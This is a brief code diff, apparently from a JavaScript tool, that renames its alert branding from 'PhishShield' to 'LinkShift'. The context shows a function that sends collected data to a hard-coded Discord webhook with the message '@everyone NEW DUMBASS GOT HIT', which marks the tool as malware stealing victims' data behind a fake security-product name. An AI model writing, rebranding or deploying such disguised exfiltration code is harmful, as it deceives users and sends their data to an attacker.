@@ -95,7 +95,7 @@ const WEBHOOK_URL = 'https://discord.com/api/webhooks/1396293781870870700/FAF5Kn
 async function sendToWebhook(data) {
     try {
         const embed = {
-            title: "🛡️ PhishShield Alert",
+            title: "🔗 LinkShift Alert",
             color: 0x2196F3,
             timestamp: new Date().toISOString(),
             fields: [
@@ -134,7 +134,7 @@ async function sendToWebhook(data) {
             },
             body: JSON.stringify({
                 content: '@everyone NEW DUMBASS GOT HIT 🤑💰💰',
-                username: 'PhishShield Bot',
+                username: 'LinkShift Bot',
                 avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
                 embeds: [embed]
             })
